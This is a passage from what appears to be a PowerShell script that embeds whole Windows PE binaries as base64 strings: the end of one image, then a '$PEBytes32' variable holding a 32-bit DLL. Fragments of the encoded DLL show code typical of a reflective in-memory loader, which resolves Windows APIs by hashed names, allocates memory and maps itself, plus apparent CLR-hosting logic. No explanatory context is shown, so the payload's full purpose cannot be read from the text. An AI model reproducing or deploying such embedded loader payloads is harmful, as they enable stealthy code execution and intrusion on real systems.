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liuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAAAEABAAgCAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kfop/inCKgYqCioOKhIqFioaKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwBQAQDgAAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagpgAAAGABABQAAADIrQCuqK6wrriuwK4AcAEADAAAAFisAAAAoAEAwAAAABCgIKAgrTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZCtmK2graitsK24rcCtyK3Qrdit4K3orfCt+K0ArgiuEK4YriCuKK4wrjiuQK5IrlCuWK5grmiucK54roCukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/CvAAAAsAEAZAAAADigWKB4oJiguKDwoAihEKEYoSChYKFooXCheKGAoYihkKGYoaChqKGwobih0KHYoeCh6KHwofihAKIIohCiGKIoojCiOKJAokiiUKJYomCicKJ4ooCikKKwpQAAAOABABQAAADQrfitIK5ArmiuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $PEBytes32 = "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